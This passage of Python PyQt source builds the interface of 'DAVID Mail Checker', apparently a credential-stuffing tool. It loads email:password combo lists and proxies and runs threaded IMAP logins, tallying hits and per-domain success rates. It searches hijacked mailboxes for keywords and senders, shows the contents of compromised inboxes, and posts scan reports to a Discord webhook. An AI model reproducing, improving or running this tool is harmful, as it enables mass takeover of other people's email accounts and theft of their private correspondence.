        self.main_layout.addLayout(self.create_top_bar())
        self.main_layout.addLayout(self.create_stats_dashboard())
        
        self.tabs = QTabWidget()
        self.main_layout.addWidget(self.tabs)
        
        checker_tab = QWidget()
        checker_layout = QVBoxLayout(checker_tab)
        self.tabs.addTab(checker_tab, "Checker")
        
        self.checker_tabs = QTabWidget()
        checker_layout.addWidget(self.checker_tabs)

        self.results_table_hits = self.create_results_table(["Combo", "Details"])
        self.results_table_invalids = self.create_results_table(["Combo", "Reason"])
        self.results_table_errors = self.create_results_table(["Combo", "Error"])
        self.results_table_intelligence_hits = self.create_results_table(["Email", "Match Type", "Match Detail", "Mailbox", "Found"])
        self.domain_stats_table = self.create_results_table(["Domain", "Hits", "Success %"])
        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        
        self.checker_tabs.addTab(self.results_table_hits, "Hits (0)")
        self.checker_tabs.addTab(self.results_table_intelligence_hits, "Intelligence Hits (0)")
        self.checker_tabs.addTab(self.results_table_invalids, "Invalids (0)")
        self.checker_tabs.addTab(self.results_table_errors, "Errors (0)")
        self.checker_tabs.addTab(self.domain_stats_table, "Domain Stats")
        self.checker_tabs.addTab(self.log_box, "Log")

        self.init_imap_viewer_tab()

        self.progress_bar = QProgressBar()
        checker_layout.addWidget(self.progress_bar)

        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_label = QLabel("Ready")
        self.cpm_label = QLabel("CPM: 0")
        self.status_bar.addWidget(self.status_label, 1)
        self.status_bar.addWidget(self.cpm_label)

    def init_imap_viewer_tab(self):
        viewer_tab = QWidget()
        layout = QVBoxLayout(viewer_tab)

        # Login area
        login_group = QGroupBox("IMAP Account Login")
        login_layout = QHBoxLayout(login_group)
        self.imap_email = QLineEdit()
        self.imap_email.setPlaceholderText("Email Address")
        self.imap_password = QLineEdit()
        self.imap_password.setPlaceholderText("Password")
        self.imap_password.setEchoMode(QLineEdit.EchoMode.Password)
        self.imap_server = QLineEdit()
        self.imap_server.setPlaceholderText("IMAP Server (auto-detect)")
        self.imap_connect_btn = QPushButton("Connect")
        self.imap_disconnect_btn = QPushButton("Disconnect")
        self.imap_disconnect_btn.setEnabled(False)
        login_layout.addWidget(self.imap_email)
        login_layout.addWidget(self.imap_password)
        login_layout.addWidget(self.imap_server)
        login_layout.addWidget(self.imap_connect_btn)
        login_layout.addWidget(self.imap_disconnect_btn)
        layout.addWidget(login_group)
        self.imap_email.textChanged.connect(self.autodetect_server)

        # Main view
        splitter = QSplitter(Qt.Orientation.Horizontal)
        layout.addWidget(splitter)

        self.mailbox_list = QListWidget()
        splitter.addWidget(self.mailbox_list)

        email_panel_widget = QWidget()
        email_panel_layout = QVBoxLayout(email_panel_widget)
        email_panel_layout.setContentsMargins(0,0,0,0)

        # Search box for viewer
        search_box = QHBoxLayout()
        self.viewer_search_input = QLineEdit()
        self.viewer_search_input.setPlaceholderText("Search in current mailbox...")
        self.viewer_search_btn = QPushButton("Search")
        search_box.addWidget(self.viewer_search_input)
        search_box.addWidget(self.viewer_search_btn)
        email_panel_layout.addLayout(search_box)
        
        email_view_splitter = QSplitter(Qt.Orientation.Vertical)
        
        self.email_list = QListWidget()
        email_view_splitter.addWidget(self.email_list)
        
        self.email_content_tabs = QTabWidget()
        self.email_body_view = QTextEdit()
        self.email_body_view.setReadOnly(True)
        self.email_headers_view = QTextEdit()
        self.email_headers_view.setReadOnly(True)
        self.email_content_tabs.addTab(self.email_body_view, "Body")
        self.email_content_tabs.addTab(self.email_headers_view, "Headers")
        email_view_splitter.addWidget(self.email_content_tabs)
        
        email_view_splitter.setSizes([200, 400])
        email_panel_layout.addWidget(email_view_splitter)
        splitter.addWidget(email_panel_widget)
        splitter.setSizes([200, 500])
        
        self.tabs.addTab(viewer_tab, "IMAP Viewer")

    def autodetect_server(self, text):
        try:
            domain = text.split('@')[1]
            server, port = self.get_imap_server_from_domain(domain)
            self.imap_server.setText(server)
        except IndexError:
            self.imap_server.clear()

    def get_imap_server_from_domain(self, domain):
        if domain in self.final_domains:
            mapping = self.final_domains[domain]
            return mapping['server'], mapping['port']
        return f"imap.{domain}", 993

    def init_menu_bar(self):
        menu_bar = self.menuBar()
        
        file_menu = menu_bar.addMenu("&File")
        file_menu.addAction("Load Combos...", self.load_combos)
        file_menu.addAction("Load Proxies...", self.load_proxies)
        file_menu.addSeparator()
        file_menu.addAction("Settings...", self.open_settings)
        file_menu.addSeparator()
        file_menu.addAction("Exit", self.close)

        domain_menu = menu_bar.addMenu("&Domains")
        domain_menu.addAction("Load Custom Domains...", self.load_custom_domains)
        domain_menu.addAction("View Domain Mappings...", self.view_domain_mappings)

        tools_menu = menu_bar.addMenu("&Tools")
        export_menu = tools_menu.addMenu("Export Results")
        export_menu.addAction("Export Hits...", lambda: self.export_table(self.results_table_hits))
        export_menu.addAction("Export Invalids...", lambda: self.export_table(self.results_table_invalids))
        export_menu.addAction("Export Errors...", lambda: self.export_table(self.results_table_errors))
        export_menu.addAction("Export Intelligence Hits...", lambda: self.export_table(self.results_table_intelligence_hits))
        tools_menu.addAction("Clear All Results", self.clear_all_results)

    def create_top_bar(self):
        top_bar_layout = QHBoxLayout()
        self.btn_start = QPushButton("Start Checker")
        self.btn_pause = QPushButton("Pause")
        self.btn_stop = QPushButton("Stop")

        top_bar_layout.addStretch()
        top_bar_layout.addWidget(self.btn_start)
        top_bar_layout.addWidget(self.btn_pause)
        top_bar_layout.addWidget(self.btn_stop)
        top_bar_layout.addStretch()

        self.btn_pause.setEnabled(False)
        self.btn_stop.setEnabled(False)
        
        return top_bar_layout

    def create_stats_dashboard(self):
        stats_layout = QHBoxLayout()
        stats_groupbox = QGroupBox("Live Statistics")
        stats_layout.addWidget(stats_groupbox)

        grid = QHBoxLayout(stats_groupbox)
        self.stat_labels = {}
        stats_to_create = {
            "Checked": ("#aaffff", 0), "Hits": ("#aaff7f", 0), 
            "Invalids": ("#ffaaaa", 0), "Errors": ("#ffaa7f", 0),
            "Intel Hits": ("#ffff7f", 0), "Combos": ("#aaaaff", 0),
            "Proxies": ("#aaffaa", 0)
        }
        for name, (color, val) in stats_to_create.items():
            box = QVBoxLayout()
            lbl_name = QLabel(name)
            lbl_name.setAlignment(Qt.AlignmentFlag.AlignCenter)
            lbl_value = QLabel(str(val))
            lbl_value.setAlignment(Qt.AlignmentFlag.AlignCenter)
            lbl_value.setFont(QFont("Arial", 14, QFont.Weight.Bold))
            lbl_value.setStyleSheet(f"color: {color};")
            box.addWidget(lbl_name)
            box.addWidget(lbl_value)
            grid.addLayout(box)
            self.stat_labels[name.lower().replace(" ", "_")] = lbl_value

        return stats_layout

    def create_results_table(self, headers):
        table = QTableWidget()
        table.setColumnCount(len(headers))
        table.setHorizontalHeaderLabels(headers)
        table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        if len(headers) > 1:
            table.horizontalHeader().setSectionResizeMode(len(headers) - 1, QHeaderView.ResizeMode.ResizeToContents)
        table.verticalHeader().setVisible(False)
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        table.customContextMenuRequested.connect(lambda pos, t=table: self.show_table_context_menu(t, pos))
        if "Intel" in "".join(headers):
            table.cellDoubleClicked.connect(self.show_intelligence_report)
        return table

    def init_actions(self):
        self.btn_start.clicked.connect(self.start_checking)
        self.btn_pause.clicked.connect(self.pause_checking)
        self.btn_stop.clicked.connect(self.stop_checking)
        self.imap_connect_btn.clicked.connect(self.connect_imap_viewer)
        self.imap_disconnect_btn.clicked.connect(self.disconnect_imap_viewer)
        self.mailbox_list.currentItemChanged.connect(self.on_mailbox_selected)
        self.email_list.currentItemChanged.connect(self.on_email_selected)
        self.viewer_search_btn.clicked.connect(self.search_in_viewer)
        
    def apply_stylesheet(self):
        self.setStyleSheet("""
            QMainWindow, QDialog { background-color: #2c3e50; }
            QWidget { color: #ecf0f1; }
            QMenuBar { background-color: #34495e; }
            QMenuBar::item { background: transparent; padding: 4px 8px; }
            QMenuBar::item:selected { background: #46627f; }
            QMenu { background-color: #34495e; border: 1px solid #566573; }
            QMenu::item:selected { background-color: #46627f; }
            QTabWidget::pane { border: 1px solid #34495e; }
            QTabBar::tab { background: #34495e; color: #ecf0f1; padding: 10px; border-top-left-radius: 4px; border-top-right-radius: 4px; }
            QTabBar::tab:selected { background: #46627f; }
            QTableWidget, QListWidget { background-color: #34495e; gridline-color: #2c3e50; border: none; }
            QHeaderView::section { background-color: #46627f; padding: 4px; border: 1px solid #2c3e50; }
            QPushButton { background-color: #3498db; border: none; padding: 8px 16px; border-radius: 4px; font-weight: bold; }
            QPushButton:hover { background-color: #5dade2; }
            QPushButton:pressed { background-color: #217dbb; }
            QPushButton:disabled { background-color: #566573; }
            QLineEdit, QSpinBox, QComboBox, QDateEdit, QTextEdit { background-color: #34495e; border: 1px solid #566573; padding: 5px; border-radius: 4px; }
            QProgressBar { border-radius: 4px; text-align: center; }
            QProgressBar::chunk { background-color: #3498db; border-radius: 4px; }
            QGroupBox { border: 1px solid #34495e; margin-top: 10px; font-weight: bold; }
            QGroupBox::title { subcontrol-origin: margin; subcontrol-position: top center; padding: 0 3px; }
            QStatusBar { background-color: #34495e; }
            QSplitter::handle { background-color: #46627f; }
        """)

    def _load_ini_domains(self):
        config = configparser.ConfigParser()
        if os.path.exists('domains.ini'):
            config.read('domains.ini', encoding='utf-8')
            for section in config.sections():
                if section != 'DEFAULT':
                    self.ini_domains[section] = {
                        'server': config.get(section, 'server', fallback=f"imap.{section}"),
                        'port': config.getint(section, 'port', fallback=993),
                        'source': 'Default'
                    }

    def load_custom_domains(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Custom Domains File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            try:
                count = 0
                with open(file_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        if '|' in line:
                            domain, server = line.strip().split('|', 1)
                            self.custom_domains[domain.strip()] = {
                                'server': server.strip(),
                                'port': 993,
                                'source': 'Custom'
                            }
                            count += 1
                self._update_final_domains()
                self.update_status(f"Loaded {count} custom domain mappings.", "cyan")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load custom domains file: {e}")

    def _update_final_domains(self):
        self.final_domains = self.ini_domains.copy()
        self.final_domains.update(self.custom_domains)

    def view_domain_mappings(self):
        dialog = DomainViewerDialog(self.final_domains, self)
        dialog.exec()

    def load_combos(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Combo List", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.combos = f.readlines()
                self.combos_loaded = len(self.combos)
                self.stat_labels['combos'].setText(str(self.combos_loaded))
                self.progress_bar.setMaximum(self.combos_loaded)
                self.update_status(f"Loaded {self.combos_loaded} combos from {os.path.basename(file_path)}", "lime")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load combo file: {e}")

    def load_proxies(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Proxy List", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                self.proxies_loaded = len(self.proxies)
                self.stat_labels['proxies'].setText(str(self.proxies_loaded))
                self.update_status(f"Loaded {self.proxies_loaded} proxies from {os.path.basename(file_path)}", "lime")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load proxy file: {e}")

    def get_current_settings(self):
        self._update_final_domains()
        return {
            "threads": self.settings.value("threads", 50, type=int),
            "timeout": self.settings.value("timeout", 10, type=int),
            "delimiter": self.settings.value("delimiter", ":"),
            "hits_file": self.settings.value("hits_file", "hits.txt"),
            "invalids_file": self.settings.value("invalids_file", "invalids.txt"),
            "use_proxies": self.settings.value("use_proxies", False, type=bool),
            "intelligence_search_enabled": self.settings.value("intelligence_search_enabled", False, type=bool),
            "intelligence_keywords": self.settings.value("intelligence_keywords", ""),
            "intelligence_senders": self.settings.value("intelligence_senders", ""),
            "search_in_subject": self.settings.value("search_in_subject", True, type=bool),
            "search_in_body": self.settings.value("search_in_body", True, type=bool),
            "intelligence_mailboxes": self.settings.value("intelligence_mailboxes", "INBOX"),
            "intelligence_emails_to_fetch": self.settings.value("intelligence_emails_to_fetch", 5, type=int),
            "intelligence_hits_file": self.settings.value("intelligence_hits_file", "intelligence_hits.txt"),
            "domain_mappings": self.final_domains
        }

    def start_checking(self):
        if not hasattr(self, 'combos') or not self.combos:
            QMessageBox.warning(self, "Warning", "Please load a combo list first.")
            return
        
        if self.settings.value("use_proxies", type=bool) and (not hasattr(self, 'proxies') or not self.proxies):
            QMessageBox.warning(self, "Warning", "Proxy usage is enabled, but no proxies are loaded.")
            return

        self.is_running = True
        self.is_paused = False
        self.reset_ui()

        self.worker = CheckerWorker(self.get_current_settings())
        for combo in self.combos:
            self.worker.combo_queue.put(combo)
        if hasattr(self, 'proxies'):
            for proxy in self.proxies:
                self.worker.proxy_queue.put(proxy)
        
        self.worker_thread = QThread()
        self.worker.moveToThread(self.worker_thread)

        self.worker.signals.progress.connect(self.update_progress)
        self.worker.signals.result.connect(self.add_result_to_table)
        self.worker.signals.log.connect(self.add_log_message)
        self.worker.signals.finished.connect(self.on_checking_finished)
        self.worker.signals.cpm.connect(self.update_cpm)
        self.worker.signals.domain_stat.connect(self.update_domain_stats)
        self.worker.signals.keyword_hit_details.connect(self.add_intelligence_hit_details)
        
        self.worker_thread.started.connect(self.worker.run)
        self.worker_thread.start()

        self.toggle_controls(True)
        self.update_status("Checker started...", "yellow")

    def pause_checking(self):
        if not self.is_running: return
        self.is_paused = not self.is_paused
        self.worker.toggle_pause()
        self.btn_pause.setText("Resume" if self.is_paused else "Pause")
        self.update_status("Checker paused." if self.is_paused else "Checker resumed.", "orange")

    def stop_checking(self):
        if not self.is_running: return
        self.worker.stop()
        self.worker_thread.quit()
        self.worker_thread.wait()
        self.is_running = False
        self.is_paused = False
        self.toggle_controls(False)
        self.update_status("Checker stopped by user.", "red")

    def on_checking_finished(self, final_stats, elapsed_time, final_cpm):
        self.is_running = False
        self.is_paused = False
        self.toggle_controls(False)
        self.update_status("Checker finished.", "lime")
        if self.worker_thread:
            self.worker_thread.quit()
        self.send_discord_notification(final_stats, elapsed_time, final_cpm)
        QMessageBox.information(self, "Finished", "The checking process has completed.")

    def open_settings(self):
        dialog = SettingsDialog(self.settings, self)
        dialog.exec()

    def update_status(self, message, color="white"):
        self.status_label.setText(message)
        self.status_label.setStyleSheet(f"color: {color};")
        
    def update_cpm(self, cpm_val):
        self.cpm_label.setText(f"CPM: {cpm_val}")

    def toggle_controls(self, running):
        self.menuBar().setEnabled(not running)
        self.btn_start.setEnabled(not running)
        self.btn_pause.setEnabled(running)
        self.btn_stop.setEnabled(running)

    def reset_ui(self):
        tables = [self.results_table_hits, self.results_table_invalids, self.results_table_errors, self.results_table_intelligence_hits, self.domain_stats_table]
        for table in tables:
            table.setRowCount(0)
        
        self.domain_stats_data.clear()

        self.log_box.clear()
        self.progress_bar.setValue(0)
        self.update_cpm(0)
        for label_key, label in self.stat_labels.items():
            if label_key not in ['combos', 'proxies']:
                label.setText("0")
    
    def clear_all_results(self):
        reply = QMessageBox.question(self, "Confirm Clear", "Are you sure you want to clear all results and logs from the UI?",
                                     QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            self.reset_ui()
            self.update_status("UI cleared.", "white")

    def add_result_to_table(self, result_type, combo, details):
        table_map = {
            "hit": (self.results_table_hits, "lime", 0, "Hits"),
            "invalid": (self.results_table_invalids, "red", 2, "Invalids"),
            "error": (self.results_table_errors, "orange", 3, "Errors"),
        }
        if result_type not in table_map: return

        table, color_str, tab_idx, tab_name = table_map[result_type]
        color = QColor(color_str)
        
        row_position = table.rowCount()
        table.insertRow(row_position)
        
        item1 = QTableWidgetItem(combo)
        item2 = QTableWidgetItem(details)
        brush = QBrush(color)
        item1.setForeground(brush)
        item2.setForeground(brush)
        
        table.setItem(row_position, 0, item1)
        table.setItem(row_position, 1, item2)
        self.checker_tabs.setTabText(tab_idx, f"{tab_name} ({row_position + 1})")
        
    def add_intelligence_hit_details(self, email_addr, match_type, match_detail, mailbox, details_list):
        table = self.results_table_intelligence_hits
        row_pos = table.rowCount()
        table.insertRow(row_pos)
        
        email_item = QTableWidgetItem(email_addr)
        type_item = QTableWidgetItem(match_type)
        detail_item = QTableWidgetItem(match_detail)
        mailbox_item = QTableWidgetItem(mailbox)
        count_item = QTableWidgetItem(f"{len(details_list)} emails")

        brush = QBrush(QColor("#00FFFF"))
        for item in [email_item, type_item, detail_item, mailbox_item, count_item]:
            item.setForeground(brush)

        email_item.setData(Qt.ItemDataRole.UserRole, (details_list, match_type, match_detail))

        table.setItem(row_pos, 0, email_item)
        table.setItem(row_pos, 1, type_item)
        table.setItem(row_pos, 2, detail_item)
        table.setItem(row_pos, 3, mailbox_item)
        table.setItem(row_pos, 4, count_item)
        self.checker_tabs.setTabText(1, f"Intelligence Hits ({self.results_table_intelligence_hits.rowCount()})")


    def show_intelligence_report(self, row, column):
        item = self.results_table_intelligence_hits.item(row, 0)
        if item:
            data = item.data(Qt.ItemDataRole.UserRole)
            if data:
                details_list, match_type, match_detail = data
                dialog = IntelligenceReportDialog(details_list, match_type, match_detail, self)
                dialog.exec()

    def add_log_message(self, message, color):
        self.log_box.moveCursor(QTextCursor.MoveOperation.End)
        self.log_box.setTextColor(color)
        self.log_box.insertPlainText(f"{datetime.now().strftime('%H:%M:%S')} - {message}\n")
        self.log_box.moveCursor(QTextCursor.MoveOperation.End)

    def update_progress(self, checked, hits, invalids, errors, keyword_hits):
        if self.combos_loaded > 0:
            self.progress_bar.setValue(checked)
        self.stat_labels['checked'].setText(str(checked))
        self.stat_labels['hits'].setText(str(hits))
        self.stat_labels['invalids'].setText(str(invalids))
        self.stat_labels['errors'].setText(str(errors))
        self.stat_labels['intel_hits'].setText(str(keyword_hits))

    def update_domain_stats(self, domain, status):
        self.domain_stats_data[domain]['total'] += 1
        if status == 'hit':
            self.domain_stats_data[domain]['hits'] += 1
        
        self.domain_stats_table.setSortingEnabled(False)
        found = False
        for row in range(self.domain_stats_table.rowCount()):
            if self.domain_stats_table.item(row, 0).text() == domain:
                found = True
                hits = self.domain_stats_data[domain]['hits']
                total = self.domain_stats_data[domain]['total']
                success_rate = (hits / total) * 100 if total > 0 else 0
                self.domain_stats_table.item(row, 1).setText(str(hits))
                self.domain_stats_table.item(row, 2).setText(f"{success_rate:.2f}%")
                break
        
        if not found:
            row_pos = self.domain_stats_table.rowCount()
            self.domain_stats_table.insertRow(row_pos)
            self.domain_stats_table.setItem(row_pos, 0, QTableWidgetItem(domain))
            self.domain_stats_table.setItem(row_pos, 1, QTableWidgetItem("1" if status == 'hit' else "0"))
            self.domain_stats_table.setItem(row_pos, 2, QTableWidgetItem("100.00%" if status == 'hit' else "0.00%"))
        
        self.domain_stats_table.setSortingEnabled(True)

    def show_table_context_menu(self, table, position):
        menu = QMenu()
        copy_action = menu.addAction("Copy Selected Rows")
        action = menu.exec(table.mapToGlobal(position))
        if action == copy_action:
            self.copy_table_selection(table)
    
    def copy_table_selection(self, table):
        selection = table.selectionModel().selectedRows()
        if not selection: return
        
        clipboard_text = ""
        for index in sorted(selection):
            row_text = [table.item(index.row(), col).text() for col in range(table.columnCount())]
            clipboard_text += "\t".join(row_text) + "\n"
        
        QApplication.clipboard().setText(clipboard_text)

    def export_table(self, table):
        if table.rowCount() == 0:
            QMessageBox.information(self, "Export", "There is no data to export.")
            return

        file_path, _ = QFileDialog.getSaveFileName(self, "Save as CSV", "", "CSV Files (*.csv)")
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8', newline='') as f:
                    headers = [table.horizontalHeaderItem(i).text() for i in range(table.columnCount())]
                    f.write(','.join(headers) + '\n')
                    for row in range(table.rowCount()):
                        row_data = [table.item(row, col).text().replace(',', ';') for col in range(table.columnCount())]
                        f.write(','.join(row_data) + '\n')
                self.update_status(f"Exported data to {os.path.basename(file_path)}", "lime")
            except Exception as e:
                QMessageBox.critical(self, "Export Error", f"Failed to export data: {e}")

    def send_discord_notification(self, stats, elapsed_time, cpm):
        if not self.settings.value("discord_enabled", type=bool) or not requests:
            return
        
        webhook_url = self.settings.value("discord_webhook_url")
        if not webhook_url: return

        elapsed_str = str(timedelta(seconds=int(elapsed_time)))
        
        embed = {
            "title": "DAVID Mail Checker - Scan Report",
            "color": 0x3498db,
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {"text": "Powered by DAVID Mail Checker"},
            "fields": [
                {"name": "Total Checked", "value": f"```{stats['checked']}/{self.combos_loaded}```", "inline": True},
                {"name": "Hits", "value": f"```{stats['hits']}```", "inline": True},
                {"name": "Invalids", "value": f"```{stats['invalids']}```", "inline": True},
                {"name": "Errors", "value": f"```{stats['errors']}```", "inline": True},
                {"name": "Intelligence Hits", "value": f"```{stats['keyword_hits']}```", "inline": True},
                {"name": "Proxies Used", "value": f"```{self.proxies_loaded if self.settings.value('use_proxies', type=bool) else 0}```", "inline": True},
                {"name": "Avg. CPM", "value": f"```{cpm}```", "inline": True},
                {"name": "Runtime", "value": f"```{elapsed_str}```", "inline": True},
            ]
        }
        
        payload = {"embeds": [embed], "username": "DAVID Checker Bot"}
        
        try:
            response = requests.post(webhook_url, json=payload, timeout=10)
            if 200 <= response.status_code < 300:
                self.log_and_update("Discord notification sent successfully.", QColor("lime"))
            else:
                self.log_and_update(f"Failed to send Discord notification: {response.status_code} {response.text}", QColor("red"))
        except Exception as e:
            self.log_and_update(f"Error sending Discord notification: {e}", QColor("red"))

    def connect_imap_viewer(self):
        email = self.imap_email.text()
        password = self.imap_password.text()
        server = self.imap_server.text()

        if not all([email, password, server]):
            QMessageBox.warning(self, "IMAP Viewer", "Please fill in all fields.")
            return

        self.disconnect_imap_viewer()

        self.imap_connect_btn.setEnabled(False)
        self.imap_disconnect_btn.setEnabled(True)
        self.update_status(f"Connecting to {server}...", "yellow")

        self.imap_client = IMAPClient(email, password, server)
        self.imap_thread = QThread()
        self.imap_client.moveToThread(self.imap_thread)

        self.imap_client.signals.error.connect(self.on_imap_error)
        self.imap_client.signals.mailboxes_loaded.connect(self.on_mailboxes_loaded)
        self.imap_client.signals.emails_loaded.connect(self.on_emails_loaded)
        self.imap_client.signals.email_content_loaded.connect(self.on_email_content_loaded)

        self.imap_thread.started.connect(self.run_imap_connect)
        self.imap_thread.start()
        
    def disconnect_imap_viewer(self):
        if self.imap_thread and self.imap_thread.isRunning():
            self.imap_client.disconnect()
            self.imap_thread.quit()
            self.imap_thread.wait()
        
        self.mailbox_list.clear()
        self.email_list.clear()
        self.email_body_view.clear()
        self.email_headers_view.clear()
        self.imap_connect_btn.setEnabled(True)
        self.imap_disconnect_btn.setEnabled(False)
        self.update_status("Disconnected from IMAP server.", "white")


    def run_imap_connect(self):
        if self.imap_client.connect():
            self.imap_client.list_mailboxes()

    def on_imap_error(self, error_msg):
        self.update_status(f"IMAP Error: {error_msg}", "red")
        self.imap_connect_btn.setEnabled(True)
        self.imap_disconnect_btn.setEnabled(False)

    def on_mailboxes_loaded(self, mailboxes):
        self.update_status("Connected. Select a mailbox.", "lime")
        self.mailbox_list.clear()
        self.mailbox_list.addItems(mailboxes)

    def on_mailbox_selected(self, current_item):
        if not current_item or not self.imap_client: return
        self.search_in_viewer()

    def search_in_viewer(self):
        current_item = self.mailbox_list.currentItem()
        if not current_item or not self.imap_client:
            QMessageBox.warning(self, "IMAP Viewer", "Please select a mailbox first.")
            return

        mailbox = current_item.text()
        search_term = self.viewer_search_input.text()
        
        self.update_status(f"Searching in {mailbox}...", "yellow")
        self.email_list.clear()
        self.email_body_view.clear()
        self.email_headers_view.clear()
        self.imap_client.fetch_emails(mailbox, search_term)


    def on_emails_loaded(self, emails):
        self.update_status(f"Loaded {len(emails)} emails. Select an email to view.", "lime")
        self.email_list.clear()
        for email_data in emails:
            item = QListWidgetItem(f"From: {email_data['from'][:30]}...\nSubject: {email_data['subject'][:40]}...")
            item.setData(Qt.ItemDataRole.UserRole, email_data['uid'])
            self.email_list.addItem(item)
    
    def on_email_selected(self, current_item):
        if not current_item or not self.imap_client: return
        uid = current_item.data(Qt.ItemDataRole.UserRole)
        self.update_status(f"Fetching content for email UID {uid}...", "yellow")
        self.email_body_view.clear()
        self.email_headers_view.clear()
        self.imap_client.fetch_email_content(uid)

    def on_email_content_loaded(self, content):
        self.update_status("Email content loaded.", "lime")
        self.email_body_view.setText(content['body'])
        self.email_headers_view.setText(content['headers'])


    def closeEvent(self, event):
        self.disconnect_imap_viewer()
        if self.is_running:
            reply = QMessageBox.question(self, "Exit DAVID Mail Checker", "Checker is running. Are you sure you want to exit?",
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                                         QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.Yes:
                self.stop_checking()
                event.accept()
            else:
                event.ignore()
        else:
            event.accept()

def global_exception_hook(exctype, value, traceback):
    sys.__excepthook__(exctype, value, traceback)
    logging.critical("Unhandled exception caught by hook:", exc_info=(exctype, value, traceback))
    QMessageBox.critical(None, "Critical Error", f"An unhandled error occurred: {value}\n\nPlease check david_mail_checker_debug.log for details.")
    QApplication.quit()

if __name__ == '__main__':
    sys.excepthook = global_exception_hook
    app = QApplication(sys.argv)
    app.setApplicationName("DAVID_MailChecker")
    app.setOrganizationName("DAVID_MailChecker")
    main_win = MainWindow()
    main_win.show()
    sys.exit(app.exec())
